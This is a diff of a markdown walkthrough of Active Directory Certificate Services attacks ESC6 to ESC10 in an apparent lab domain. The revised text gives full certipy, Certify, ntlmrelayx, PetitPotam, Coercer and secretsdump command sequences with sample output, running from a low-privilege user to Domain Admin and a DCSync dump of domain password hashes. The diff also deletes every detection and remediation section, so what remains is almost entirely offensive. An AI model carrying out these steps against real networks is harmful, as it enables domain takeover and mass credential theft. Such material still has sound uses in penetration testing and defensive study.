 # [*] Saved certificate and private key to 'administrator.pfx'
 ```
 
 ```powershell
-# Windows — Certify with /altname flag
+# Windows — Certify
+# Even templates WITHOUT EnrolleeSuppliesSubject now accept /altname
 .\Certify.exe request \
   /ca:ca01.corp.local\Corp-CA \
   /template:User \
   /altname:administrator
 
-# Even though User template doesn't have EnrolleeSuppliesSubject,
-# the CA flag overrides and accepts our requested SAN
+# This works because the CA flag overrides the template setting!
 ```
 
-#### Step 4: Authenticate and Escalate
+**Step 3 — Authenticate and escalate**
 
 ```bash
 certipy auth -pfx administrator.pfx -dc-ip 192.168.10.10
-# → Hash for administrator
 
 python3 secretsdump.py \
   -hashes 'aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71' \
   'corp.local/administrator@192.168.10.10'
 ```
 
-### Detection & Remediation
-
-```bash
-# Detection
-# Check for flag presence (run regularly as scheduled task):
-certutil -config "ca01.corp.local\Corp-CA" -getreg policy\EditFlags | grep EDITF_ATTRIBUTESUBJECTALTNAME2
-
-# Event ID 4899: Certificate Services changed configuration
-# Monitor registry: HKLM\SYSTEM\...\CertSvc\Configuration\...\EditFlags
-
-# Remediation — Remove the flag
-certutil -config "ca01.corp.local\Corp-CA" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
-
-# Restart CertSvc
-net stop certsvc && net start certsvc
-# Or:
-Restart-Service certsvc
-
-# Verify it's gone
-certutil -config "ca01.corp.local\Corp-CA" -getreg policy\EditFlags
-# EDITF_ATTRIBUTESUBJECTALTNAME2 should NOT appear
-```
-
 ---
 
-## ESC7 — Vulnerable CA ACL (ManageCA / ManageCertificates)
+## ESC7 — Vulnerable CA Access Control
 
-### Root Cause of Vulnerability
+### CA Rights Hierarchy
 
-The CA object itself has an ACL controlling who can manage it. Two rights are particularly dangerous:
+```
+┌──────────────────────────────────────────────────────────────────┐
+│                    CA ACCESS CONTROL LEVELS                        │
+│                                                                    │
+│  LEVEL 1: CA Administrator (ManageCA)                             │
+│  ────────────────────────────────────                             │
+│  • Configure CA settings (set EDITF flags → ESC6!)               │
+│  • Manage CA officers and enrollment agents                        │
+│  • Backup and restore CA                                           │
+│  • Renew CA certificate                                            │
+│  • DANGER: Can enable user-specified SAN → instant ESC6           │
+│                                                                    │
+│  LEVEL 2: Certificate Manager (ManageCertificates)               │
+│  ─────────────────────────────────────────────────                │
+│  • Approve or deny PENDING certificate requests                   │
+│  • Revoke issued certificates                                      │
+│  • Re-issue pending requests                                       │
+│  • DANGER: Can approve own pending requests (bypass approval)     │
+│                                                                    │
+│  LEVEL 3: Enroll                                                  │
+│  ──────────────                                                    │
+│  • Request certificates from templates                             │
+│  • Normal user right, not dangerous on its own                    │
+└──────────────────────────────────────────────────────────────────┘
+```
 
-**`ManageCA`** (CA Administrator right):
-- Can modify CA configuration
-- Can enable `EDITF_ATTRIBUTESUBJECTALTNAME2` → ESC6
-- Can add/remove CA managers and enrollment agents
-- Can issue failed/pending requests
+### ESC7-1: ManageCA Attack Flow
 
-**`ManageCertificates`** (Certificate Manager right):
-- Can approve or deny pending certificate requests
-- This bypasses the "Manager Approval Required" control on templates
-- An attacker with this right can approve their own malicious certificate requests
+```
+lowpriv has ManageCA on Corp-CA
+        │
+        ▼
+Enable EDITF_ATTRIBUTESUBJECTALTNAME2
+(certipy ca --enable-userspecifiedsan)
+        │
+        ▼
+Now EVERY template on Corp-CA accepts
+user-supplied SAN (ESC6 conditions met)
+        │
+        ▼
+Request cert with admin UPN via any template
+        │
+        ▼
+Domain Admin
+```
 
-These rights are separate from OS-level admin rights and are controlled purely by the CA's own ACL, which is stored in AD.
+### ESC7-2: ManageCertificates Bypass Flow
 
-### Step-by-Step Exploitation — ESC7-1 (ManageCA → ESC6)
+```
+Template "HighSecTemplate" has Manager Approval required
+        │
+        │  Normally: request → PENDING → waiting for CA officer
+        │  With ManageCertificates: attacker IS the CA officer!
+        │
+        ▼
+Step 1: Submit request with admin SAN → Request ID 47 (PENDING)
+        │
+        ▼
+Step 2: certipy ca --issue-request 47 (using ManageCertificates)
+        │
+        ▼
+Step 3: Retrieve issued certificate
+        │
+        ▼
+Step 4: certipy auth → Domain Admin
+```
 
-#### Step 1: Identify ManageCA Rights
+### Step-by-Step Exploitation — ESC7-1
+
+**Step 1 — Identify ManageCA rights**
 
 ```bash
 certipy find \
@@ -1124,23 +1213,15 @@ certipy find \
   -dc-ip 192.168.10.10 \
   -stdout
 
-# Look for:
+# Certificate Authorities
 #   CA Permissions
-#     ManageCA              : CORP\lowpriv   ← Got it
+#     ManageCA              : CORP\lowpriv    ← GOT IT
 #     ManageCertificates    : CORP\lowpriv
 ```
 
-```powershell
-# Check who has ManageCA using certutil
-certutil -config "ca01.corp.local\Corp-CA" -getreg CA\SecurityDescriptor
-# Or view in Certification Authority MMC:
-# certsrv.msc → Corp-CA → Properties → Security
-```
-
-#### Step 2: Enable User-Specified SAN via ManageCA
+**Step 2 — Enable user-specified SAN flag via ManageCA**
 
 ```bash
-# Certipy can directly enable the flag using ManageCA rights
 certipy ca \
   -u lowpriv@corp.local \
   -p 'Password123!' \
@@ -1148,31 +1229,28 @@ certipy ca \
   -enable-userspecifiedsan \
   -dc-ip 192.168.10.10
 
+# ══ OUTPUT ══════════════════════════════════════════════════════
 # [*] Successfully updated 'Corp-CA'
-# Now EDITF_ATTRIBUTESUBJECTALTNAME2 is set → ESC6 applies
+# [*] EDITF_ATTRIBUTESUBJECTALTNAME2 is now set
 ```
 
-#### Step 3: Exploit as ESC6
+**Step 3 — Exploit as ESC6**
 
 ```bash
 certipy req \
-  -u lowpriv@corp.local \
-  -p 'Password123!' \
-  -ca 'Corp-CA' \
-  -template 'User' \
+  -u lowpriv@corp.local -p 'Password123!' \
+  -ca 'Corp-CA' -template 'User' \
   -upn 'administrator@corp.local' \
   -dc-ip 192.168.10.10
 
 certipy auth -pfx administrator.pfx -dc-ip 192.168.10.10
 ```
 
-### Step-by-Step Exploitation — ESC7-2 (ManageCertificates → Approve Own Request)
+### Step-by-Step Exploitation — ESC7-2
 
-#### Step 1: Submit a Certificate Request Requiring Manager Approval
+**Step 1 — Submit request that requires manager approval**
 
 ```bash
-# Request cert for a template that requires manager approval
-# Normally this would sit in a pending queue and never get approved
 certipy req \
   -u lowpriv@corp.local \
   -p 'Password123!' \
@@ -1181,15 +1259,16 @@ certipy req \
   -upn 'administrator@corp.local' \
   -dc-ip 192.168.10.10
 
-# Output:
+# ══ OUTPUT ══════════════════════════════════════════════════════
+# [*] Requesting certificate via RPC
 # [*] Request ID is 47
-# [*] Request is pending    ← Would normally die here
+# [-] Request is pending (would normally be stuck here)
+# SAVE THIS ID: 47
 ```
 
-#### Step 2: Approve Your Own Request
+**Step 2 — Approve your own request**
 
 ```bash
-# Using ManageCertificates right — approve request ID 47
 certipy ca \
   -u lowpriv@corp.local \
   -p 'Password123!' \
@@ -1197,10 +1276,11 @@ certipy ca \
   -issue-request 47 \
   -dc-ip 192.168.10.10
 
-# [*] Successfully issued certificate
+# ══ OUTPUT ══════════════════════════════════════════════════════
+# [*] Successfully issued certificate (Request ID 47)
 ```
 
-#### Step 3: Retrieve the Issued Certificate
+**Step 3 — Retrieve issued certificate**
 
 ```bash
 certipy req \
@@ -1210,244 +1290,298 @@ certipy req \
   -retrieve 47 \
   -dc-ip 192.168.10.10
 
+# ══ OUTPUT ══════════════════════════════════════════════════════
 # [*] Got certificate with UPN 'administrator@corp.local'
 # [*] Saved certificate and private key to 'administrator.pfx'
 ```
 
-#### Step 4: Authenticate
+**Step 4 — Authenticate**
 
 ```bash
 certipy auth -pfx administrator.pfx -dc-ip 192.168.10.10
-# → Full domain compromise
-```
-
-### Detection & Remediation
-
-```
-Detection:
-  Event ID 4896: One or more rows deleted from certificate database
-  Event ID 4898: Certificate Services loaded a template
-  Monitor CA permission changes in certsrv.msc
-  Alert when ManageCA or ManageCertificates is granted to non-PKI accounts
-
-Remediation:
-  certsrv.msc → Corp-CA → Properties → Security
-  Remove ManageCA and ManageCertificates from all non-PKI-admin accounts
-  Only dedicated, highly-secured PKI admin accounts should have these rights
-  Consider requiring multi-person authorization for CA management
+# → Full Domain Admin
 ```
 
 ---
 
-## ESC8 — NTLM Relay to ADCS HTTP Enrollment
+## ESC8 — NTLM Relay to ADCS HTTP
 
-### Root Cause of Vulnerability
+### Why This Attack is So Powerful
 
-ADCS includes a **web enrollment interface** running on IIS at:
-- `http://ca01.corp.local/certsrv/` (HTTP — completely vulnerable)
-- `https://ca01.corp.local/certsrv/` (HTTPS — vulnerable if EPA not enabled)
+```
+┌──────────────────────────────────────────────────────────────────┐
+│                    THE NTLM RELAY CONCEPT                         │
+│                                                                    │
+│  NTLM = challenge-response auth protocol                          │
+│  Problem: NTLM auth can be RELAYED to another server              │
+│                                                                    │
+│  Normal:  Client──NTLM──►Server                                  │
+│  Relay:   Client──NTLM──►ATTACKER──NTLM──►Different Server       │
+│                              (forwards auth transparently)        │
+│                                                                    │
+│  ADCS Web Enrollment accepts NTLM via HTTP (no signing!)          │
+│  DC machine accounts can be coerced to authenticate via NTLM      │
+│  DC machine accounts have DCSync rights                           │
+│                                                                    │
+│  CHAIN:                                                            │
+│  Coerce DC01 → relay NTLM to /certsrv/ → cert for DC01$          │
+│  → PKINIT as DC01$ → DCSync → All domain hashes                   │
+└──────────────────────────────────────────────────────────────────┘
+```
 
-This web interface accepts **NTLM authentication** to verify the requester's identity. NTLM authentication is fundamentally relayable — it's a challenge-response protocol where the victim's credentials can be forwarded to another server.
+### Full Attack Architecture
 
-The attack chain:
-1. Attacker sets up an NTLM relay listener
-2. Attacker **coerces** a high-value target (e.g., DC01 at 192.168.10.10) to authenticate to the attacker
-3. Attacker relays that authentication to `http://ca01.corp.local/certsrv/`
-4. CA server sees the request as coming from DC01$ (domain computer account)
-5. Attacker requests a certificate for DC01$ machine account
-6. DC01$ machine account certificate → PKINIT TGT as DC01$ → DCSync
-
-**Why machine accounts matter:** Domain Controller machine accounts have `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` privileges — they can DCSync and dump all domain credentials.
+```
+ATTACKER (192.168.10.99)
+      │
+      │  Step 1: Start relay listener (port 445 + HTTP client)
+      │
+  ntlmrelayx.py ──► http://ca01.corp.local/certsrv/certfnsh.asp
+      │
+      │  Step 2: Coerce DC01 to authenticate to attacker
+      │
+  PetitPotam.py ──► DC01 (192.168.10.10)
+      │
+      ▼
+DC01 sends NTLM auth to ATTACKER (192.168.10.99:445)
+      │
+      │  Step 3: Relay DC01's auth to CA01's web enrollment
+      │
+ATTACKER ──NTLM(DC01$)──► CA01 (192.168.10.20/certsrv/)
+      │
+      │  CA01 thinks it's DC01$ requesting a cert!
+      │  Issues: DomainController template cert for DC01$
+      │
+      ▼
+DC01$.pfx saved on attacker machine
+      │
+      │  Step 4: Authenticate with DC01$'s certificate
+      │
+certipy auth -pfx DC01$.pfx ──► DC01 (PKINIT)
+      │
+      │  DC01$ has DS-Replication rights
+      │
+      ▼
+secretsdump.py ──► ALL domain password hashes
+```
 
 ### Step-by-Step Exploitation
 
-#### Step 1: Verify Web Enrollment is Running
+**Step 1 — Verify web enrollment is running**
 
 ```bash
 # Check if certsrv is accessible
-curl -v http://ca01.corp.local/certsrv/ 2>&1 | head -30
+curl -v http://ca01.corp.local/certsrv/ 2>&1 | head -20
 
-# Look for:
-# HTTP/1.1 401 Unauthorized
-# WWW-Authenticate: Negotiate
-# WWW-Authenticate: NTLM    ← NTLM is accepted!
+# ══ OUTPUT ══════════════════════════════════════════════════════
+# > GET /certsrv/ HTTP/1.1
+# > Host: ca01.corp.local
+# < HTTP/1.1 401 Unauthorized
+# < WWW-Authenticate: Negotiate
+# < WWW-Authenticate: NTLM        ← NTLM is accepted
+# < Content-Type: text/html
 
-# Certipy will also show this:
+# Also via Certipy:
 certipy find -u lowpriv@corp.local -p 'Password123!' -dc-ip 192.168.10.10
-# Web Enrollment: Enabled
-# Request Disposition: Issue
+# Web Enrollment    : Enabled   ← VULNERABLE
 ```
 
-#### Step 2: Start NTLM Relay Targeting ADCS
+**Step 2 — Stop local SMB and start relay**
 
 ```bash
-# On Kali (192.168.10.99)
-# Make sure port 445 is free (stop any local SMB)
+# Stop services that use port 445
 sudo systemctl stop smbd nmbd
 
-# Start relay targeting ADCS web enrollment
-# --adcs flag extracts certificate from the relay response
+# Start ntlmrelayx targeting ADCS
 sudo python3 /opt/impacket/examples/ntlmrelayx.py \
-  -t http://ca01.corp.local/certsrv/certfnsh.asp \
+  -t http://192.168.10.20/certsrv/certfnsh.asp \
   -smb2support \
   --adcs \
   --template 'DomainController' \
-  -debug
+  --no-http-server
 
-# Output:
+# ══ OUTPUT ══════════════════════════════════════════════════════
 # [*] Protocol Client HTTPS loaded..
 # [*] Protocol Client HTTP loaded..
 # [*] Protocol Client SMB loaded..
 # [*] Running in relay mode to single host
-# [*] Setting up SMB Server
-# [*] Setting up HTTP Server
+# [*] Setting up SMB Server on 192.168.10.99:445
 # [*] Servers started, waiting for connections
 ```
 
-#### Step 3: Coerce DC Authentication (PetitPotam)
+**Step 3 — Coerce DC01 to authenticate to attacker**
 
 ```bash
-# Open a second terminal on Kali
-# PetitPotam — triggers EFSRPC authentication from DC01 to our listener
+# Open second terminal — PetitPotam (EFSRPC coercion)
 python3 /opt/PetitPotam/PetitPotam.py \
   -u '' \
   -p '' \
   192.168.10.99 \
   192.168.10.10
 
-# Output:
+# ══ OUTPUT ══════════════════════════════════════════════════════
 # Trying pipe lsarpc
 # [+] Triggering authentication via EfsRpcOpenFileRaw (opnum 0)
 # [+] Got authentication from 192.168.10.10
 ```
 
 ```bash
-# Alternative: PrinterBug (MS-RPRN Spooler)
+# Alternative: PrinterBug (MS-RPRN)
 python3 printerbug.py \
   'corp.local/lowpriv:Password123!@192.168.10.10' \
   192.168.10.99
-```
 
-```bash
-# Alternative: Coercer (tries all methods)
+# Alternative: DFSCoerce
+python3 dfscoerce.py \
+  -u '' -p '' \
+  192.168.10.99 \
+  192.168.10.10
+
+# Alternative: Coercer (tries ALL methods)
 coercer coerce \
-  -u lowpriv \
-  -p 'Password123!' \
-  -d corp.local \
+  -u lowpriv -p 'Password123!' -d corp.local \
   -l 192.168.10.99 \
   -t 192.168.10.10
 ```
 
-#### Step 4: Capture the Certificate
+**Step 4 — Watch relay capture the certificate**
 
 ```bash
-# Back in the ntlmrelayx terminal, you should see:
+# Back in ntlmrelayx terminal:
+# ══ OUTPUT ══════════════════════════════════════════════════════
 # [*] SMBD-Thread-3: Incoming connection (192.168.10.10, 50234)
-# [*] Authenticating against http://ca01.corp.local/certsrv/certfnsh.asp as CORP/DC01$
-# [*] HTTPD(80): Connection from CORP/DC01$ authenticated
+# [*] SMBD-Thread-3: Connection from CORP/DC01$ authenticated
+# [*] Authenticating against http://192.168.10.20/certsrv/certfnsh.asp
+# [*] HTTPD: Connection from 192.168.10.99 @192.168.10.20 authenticated
 # [*] Generating CSR for DC01$...
-# [*] Successfully requested certificate
-# [*] DC01$ certificate:
-#     MIIFsz ... [base64]
+# [*] Successfully requested certificate for DC01$
+# [*] Got certificate with DNS Host Name 'dc01.corp.local'
+# [*] Certificate is:
+#     MIIFsz...
 # [*] Saved certificate to: DC01$.pfx
 ```
 
-#### Step 5: Authenticate as Domain Controller
+**Step 5 — Authenticate as DC01$ using the certificate**
 
 ```bash
-# Use DC01's certificate for PKINIT
 certipy auth \
   -pfx 'DC01$.pfx' \
   -dc-ip 192.168.10.10 \
   -username 'DC01$' \
   -domain corp.local
 
-# Output:
+# ══ OUTPUT ══════════════════════════════════════════════════════
 # [*] Using principal: DC01$@corp.local
+# [*] Trying to get TGT...
 # [*] Got TGT
 # [*] Saved credential cache to 'DC01$.ccache'
-# [*] Got hash for 'DC01$@corp.local': aad3b435b51404eeaad3b435b51404ee:d3b5f3b4c3a2a1b0f9e8d7c6b5a4f3e2
+# [*] Got hash for 'DC01$@corp.local':
+#     aad3b435b51404eeaad3b435b51404ee:d3b5f3b4c3a2a1b0f9e8d7c6b5a4f3e2
 ```
 
-#### Step 6: DCSync Using DC Machine Account
+**Step 6 — DCSync using DC machine account**
 
 ```bash
-export KRB5CCNAME=DC01\$.ccache
-
-# Use DC account to DCSync all hashes
-python3 secretsdump.py \
-  -k \
-  -no-pass \
-  -just-dc \
-  dc01.corp.local
-
-# Output:
-# [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
-# Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
-# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:19e9b6b62bd6e15f3a5bcf1c6f3e4d2a:::
-# [... all domain users ...]
-
-# Or use Pass-the-Hash
+# DC machine accounts have DS-Replication privileges
 python3 secretsdump.py \
   -hashes 'aad3b435b51404eeaad3b435b51404ee:d3b5f3b4c3a2a1b0f9e8d7c6b5a4f3e2' \
   'corp.local/DC01$@192.168.10.10'
-```
 
-### Detection & Remediation
-
-```bash
-# Detection
-# IIS logs on CA01 — look for machine accounts (ending in $) authenticating to certsrv
-# Event ID 4768 on DC01 — TGT requests using PKINIT from machine accounts
-# Unusual certificate enrollment for machine accounts (Event 4887)
-
-# Remediation
-
-# Option 1: Enable HTTPS + Extended Protection for Authentication (EPA)
-# On CA01 IIS:
-Import-Module WebAdministration
-Set-WebConfigurationProperty `
-  -Filter "system.webServer/security/authentication/windowsAuthentication" `
-  -Name extendedProtection.tokenChecking `
-  -PSPath "IIS:\Sites\Default Web Site\certsrv" `
-  -Value "Require"
-
-# Option 2: Disable HTTP enrollment, force HTTPS only
-# IIS Manager → Default Web Site → certsrv → Bindings → Remove HTTP
-
-# Option 3: Enable SMB signing on all machines (blocks relay)
-# GPO: Computer Configuration → Policies → Windows Settings → Security Settings →
-#   Local Policies → Security Options → Microsoft network server: Digitally sign communications (always) = Enabled
-
-# Option 4: Patch PetitPotam (disable EFS on servers that don't need it)
-# KB5005413 (for Windows Server 2019/2022)
-Set-Service -Name EFS -StartupType Disabled
-Stop-Service EFS
+# ══ OUTPUT ══════════════════════════════════════════════════════
+# [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+# [*] Using the DRSUAPI method to get NTDS.DIT secrets
+# Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
+# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:19e9b6b62bd6e15f3a5bcf1c6f3e4d2a:::
+# CORP\lowpriv:1105:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+# CORP\victimuser:1106:aad3b435b51404eeaad3b435b51404ee:2a4b8cf3d9e1f2a5b4c3d2e1f0a9b8c7:::
+# CORP$:1000:aad3b435b51404eeaad3b435b51404ee:abc123def456abc123def456abc123de:::
+# DC01$:1001:aad3b435b51404eeaad3b435b51404ee:d3b5f3b4c3a2a1b0f9e8d7c6b5a4f3e2:::
+# SRV01$:1002:aad3b435b51404eeaad3b435b51404ee:f1e2d3c4b5a6f1e2d3c4b5a6f1e2d3c4:::
+# [!] Kerberos keys grabbed
+# Administrator:aes256-cts-hmac-sha1-96:...
+# krbtgt:aes256-cts-hmac-sha1-96:...
+# [*] $MACHINE.ACC
+# [*] DPAPI_SYSTEM
 ```
 
 ---
 
-## ESC9 — No Security Extension (CT_FLAG_NO_SECURITY_EXTENSION)
+## ESC9 — No Security Extension Attack
 
-### Root Cause of Vulnerability
+### The SID Extension Problem
 
-Starting with Windows Server 2022 (and via KB5014754 for older systems), Microsoft added a new extension to certificates: `szOID_NTDS_CA_SECURITY_EXT` (OID `1.3.6.1.4.1.311.25.2`).
+```
+┌──────────────────────────────────────────────────────────────────┐
+│                CERTIFICATE IDENTITY BINDING                        │
+│                                                                    │
+│  SAFE (with security extension):                                  │
+│  Certificate contains:                                             │
+│    UPN = administrator@corp.local                                  │
+│    SID Extension = S-1-5-21-...-500  ← Administrator's SID        │
+│                                                                    │
+│  DC validation:                                                    │
+│    1. Extract UPN → find account "administrator"                  │
+│    2. Compare SID from cert with account's SID                    │
+│    3. MATCH → auth succeeds                                        │
+│    4. NO MATCH → auth fails (certificate spoofing blocked!)       │
+│                                                                    │
+│  VULNERABLE (CT_FLAG_NO_SECURITY_EXTENSION):                      │
+│  Certificate contains:                                             │
+│    UPN = administrator@corp.local                                  │
+│    SID Extension = (MISSING — CA didn't embed it)                 │
+│                                                                    │
+│  DC validation:                                                    │
+│    1. Extract UPN → find account "administrator"                  │
+│    2. No SID to check → fall back to UPN-only mapping             │
+│    3. UPN matches → auth succeeds!                                 │
+│    ← ATTACKER ABUSES THIS                                         │
+└──────────────────────────────────────────────────────────────────┘
+```
 
-This extension embeds the **SID of the user who requested the certificate** into the certificate itself. When a DC validates a certificate for authentication, it can verify: "Is the SID in this certificate's extension the same as the user account we're mapping it to?"
+### The UPN Swap Attack Flow
 
-The flag `CT_FLAG_NO_SECURITY_EXTENSION` (value `0x80000`) in `msPKI-Enrollment-Flag` tells the CA: **"Do NOT embed the SID extension in certificates from this template."**
+```
+ATTACKER has:
+  • Account: lowpriv@corp.local (own account)
+  • GenericWrite on: victimuser (another domain user)
 
-Without the SID extension, the DC falls back to mapping certificates to accounts based only on the **UPN in the SAN**. This creates a window for exploitation:
+Timeline:
 
-If an attacker has `GenericWrite` or `WriteProperty` on a user object (victimuser), they can:
-1. Change victimuser's UPN to match a target user (e.g., administrator)
-2. Request a certificate as victimuser (gets issued with "administrator" UPN, no SID binding)
-3. Restore victimuser's UPN
-4. Use the certificate to authenticate as administrator (DC matches UPN only)
+T=00s: victimuser's UPN = "victimuser@corp.local"
+       ┌─────────────────────────────────────────┐
+T=01s: │ certipy account update                  │
+       │ -user victimuser                        │
+       │ -upn administrator                      │
+       │ victimuser's UPN ← "administrator"      │
+       └─────────────────────────────────────────┘
+T=02s: ┌─────────────────────────────────────────┐
+       │ certipy req                             │
+       │ -u victimuser@corp.local                │
+       │ -template NoSecExtTemplate              │
+       │ CA issues cert:                         │
+       │   UPN = "administrator" ← from UPN attr │
+       │   No SID embedded (CT_FLAG_NO_SEC_EXT)  │
+       └─────────────────────────────────────────┘
+T=03s: ┌─────────────────────────────────────────┐
+       │ certipy account update (restore)        │
+       │ -user victimuser                        │
+       │ -upn victimuser@corp.local              │
+       │ UPN restored to normal                  │
+       └─────────────────────────────────────────┘
+T=04s: ┌─────────────────────────────────────────┐
+       │ certipy auth -pfx victimuser.pfx        │
+       │ DC: UPN = "administrator" → map to      │
+       │     Administrator account               │
+       │ DC: No SID to verify → UPN wins         │
+       │ → TGT as administrator!                 │
+       └─────────────────────────────────────────┘
+
+Total window where victimuser had wrong UPN: ~2 seconds
+```
 
 ### Step-by-Step Exploitation
 
-#### Step 1: Find Template with No Security Extension
+**Step 1 — Find template with No Security Extension**
 
 ```bash
 certipy find \
@@ -1457,53 +1591,39 @@ certipy find \
   -vulnerable
 
 # Look for:
-#   No Security Extension  : True
-#   Enrollee Supplies Subject: False   ← This is normally "safe" — but not here
-#   Client Authentication  : True
-#   Enrollment Rights      : Domain Users
+# No Security Extension  : True
+# Enrollment Flags       : (does NOT contain INCLUDE_SYMMETRIC_ALGORITHMS)
+# Client Authentication  : True
 ```
 
-#### Step 2: Verify Write Access on Victim User Object
+**Step 2 — Verify write access on victimuser**
 
 ```bash
-# Check if lowpriv has GenericWrite on victimuser
+# Check if lowpriv can write victimuser's UPN
 python3 dacledit.py \
   -action read \
   -target 'victimuser' \
   -dc-ip 192.168.10.10 \
   'corp.local/lowpriv:Password123!'
 
-# Look for GenericWrite or WriteProperty (User-Account-Restrictions)
+# Look for: GenericWrite or WriteProperty on User-Account-Control / User-Principal-Name
 ```
 
-```powershell
-# PowerView
-Get-DomainObjectAcl -Identity victimuser -ResolveGUIDs |
-  Where-Object { $_.SecurityIdentifier -like "*lowpriv*" }
-```
-
-#### Step 3: Check Current UPN of Both Users
+**Step 3 — Record original UPN**
 
 ```bash
-# Get current UPN of victimuser (we need to restore it later)
-python3 ldapdomaindump.py \
-  -u 'corp\lowpriv' \
-  -p 'Password123!' \
-  192.168.10.10
-
-# Or:
+# Get victimuser's current UPN (important for restoration)
 certipy account update \
   -u lowpriv@corp.local \
   -p 'Password123!' \
   -user victimuser \
   -dc-ip 192.168.10.10
-# Check current UPN: victimuser@corp.local
+# Note: Current UPN = victimuser@corp.local
 ```
 
-#### Step 4: Change Victim's UPN to Target
+**Step 4 — Change victim UPN to target**
 
 ```bash
-# Change victimuser's UPN to "administrator" (just the username, no domain part)
 certipy account update \
   -u lowpriv@corp.local \
   -p 'Password123!' \
@@ -1511,15 +1631,17 @@ certipy account update \
   -upn administrator \
   -dc-ip 192.168.10.10
 
+# ══ OUTPUT ══════════════════════════════════════════════════════
 # [*] Updating user 'victimuser'
 # [*] Successfully updated 'victimuser'
-# victimuser's UPN is now: administrator (no @domain)
+# victimuser's UPN is now: administrator
 ```
 
-#### Step 5: Request Certificate AS Victim User
+**Step 5 — Request certificate as victimuser**
 
 ```bash
-# Request cert as victimuser — CA will embed "administrator" UPN (no SID!)
+# CA reads victimuser's UPN → embeds "administrator" in cert
+# No SID extension → no binding to victimuser's SID
 certipy req \
   -u victimuser@corp.local \
   -p 'Summer2024!' \
@@ -1527,15 +1649,16 @@ certipy req \
   -template 'NoSecExtTemplate' \
   -dc-ip 192.168.10.10
 
+# ══ OUTPUT ══════════════════════════════════════════════════════
+# [*] Requesting certificate via RPC
 # [*] Got certificate with UPN 'administrator'
-# [*] Certificate has no object SID  ← Key indicator
+# [!] Certificate object SID is empty   ← KEY: no SID embedded!
 # [*] Saved certificate and private key to 'victimuser.pfx'
 ```
 
-#### Step 6: Immediately Restore Victim's UPN (Stealth!)
+**Step 6 — Immediately restore victim UPN (stealth)**
 
 ```bash
-# Restore victimuser's original UPN ASAP
 certipy account update \
   -u lowpriv@corp.local \
   -p 'Password123!' \
@@ -1543,11 +1666,11 @@ certipy account update \
   -upn victimuser@corp.local \
   -dc-ip 192.168.10.10
 
-# [*] Successfully updated 'victimuser'
-# victimuser's UPN is back to normal — change window was only seconds
+# victimuser's UPN is back to normal!
+# The certificate we got still has "administrator" in it
 ```
 
-#### Step 7: Authenticate as Administrator
+**Step 7 — Authenticate as administrator**
 
 ```bash
 certipy auth \
@@ -1555,373 +1678,420 @@ certipy auth \
   -domain corp.local \
   -dc-ip 192.168.10.10
 
-# DC behavior (StrongCertificateBindingEnforcement not enforced):
-# → Cert has UPN "administrator" (no SID extension)
-# → Maps to administrator@corp.local by UPN
-# → Issues TGT as administrator
-# [*] Got hash for 'administrator@corp.local': aad3b435...:58a478135a93ac3bf058a5ea0e8fdb71
-```
+# DC checks: UPN = "administrator" → maps to Administrator account
+# DC checks: SID extension? MISSING → falls back to UPN mapping
+# DC issues: TGT for administrator!
 
-### Detection & Remediation
-
-```powershell
-# Detection
-# Event ID 4738 (User Account Changed) — watch for UPN changes
-# Correlate: UPN change on account → certificate enrollment by that account → UPN restored
-# Alert on certificates issued without the szOID_NTDS_CA_SECURITY_EXT extension
-
-# Remediation
-# 1. Remove CT_FLAG_NO_SECURITY_EXTENSION from templates
-#    certtmpl.msc → Template → Extensions → verify security extension is not suppressed
-
-# 2. Enable Strong Certificate Binding Enforcement on ALL DCs
-Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" `
-  -Name StrongCertificateBindingEnforcement -Value 2
-# 0 = disabled, 1 = compat mode (still vulnerable!), 2 = full enforcement
-
-# 3. Restrict who can modify UPN attributes (use fine-grained permissions)
+# ══ OUTPUT ══════════════════════════════════════════════════════
+# [*] Got hash for 'administrator@corp.local':
+#     aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71
 ```
 
 ---
 
-## ESC10 — Weak Certificate Mappings (DC Registry Settings)
+## ESC10 — Weak Certificate Mappings
 
-### Root Cause of Vulnerability
+### DC Registry Settings Explained
 
-Following the "Certified Pre-Owned" research, Microsoft issued **KB5014754** introducing stronger certificate-to-account mapping. The mapping behavior is controlled by DC registry keys:
-
-**Key 1:** `HKLM\SYSTEM\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement`
-- `0` = Disabled — DC only checks UPN, completely ignores SID. **Fully vulnerable.**
-- `1` = Compat mode — DC checks SID if present, falls back to UPN if not. **Still exploitable for certs without SID extension (ESC9).**
-- `2` = Full enforcement — Cert MUST have SID extension matching the account. **Secure.**
-
-**Key 2:** `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel\CertificateMappingMethods`
-Controls which mapping methods are allowed for SCHANNEL (non-Kerberos TLS auth):
-- Bit `0x4` = UPN mapping (weak)
-- Bit `0x8` = S4U2Self / subject name mapping
-
-When `CertificateMappingMethods` includes `0x4` and an attacker can modify a user's UPN, they can authenticate via SCHANNEL using a spoofed UPN certificate.
-
-### Step-by-Step Exploitation — ESC10-1
-
-#### Step 1: Confirm Weak Enforcement on DC
-
-```powershell
-# Check DC01 registry
-Invoke-Command -ComputerName dc01.corp.local -ScriptBlock {
-  Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" | 
-    Select StrongCertificateBindingEnforcement
-}
-# Value: 0 or 1 = vulnerable
-
-# Or via Certipy
-certipy find -u lowpriv@corp.local -p 'Password123!' -dc-ip 192.168.10.10
-# Check output for enforcement mode warnings
+```
+┌──────────────────────────────────────────────────────────────────┐
+│  DC01 (192.168.10.10) Registry                                    │
+│                                                                    │
+│  HKLM\SYSTEM\CurrentControlSet\Services\Kdc\                      │
+│    StrongCertificateBindingEnforcement                             │
+│                                                                    │
+│  Value 0 = DISABLED (totally vulnerable)                          │
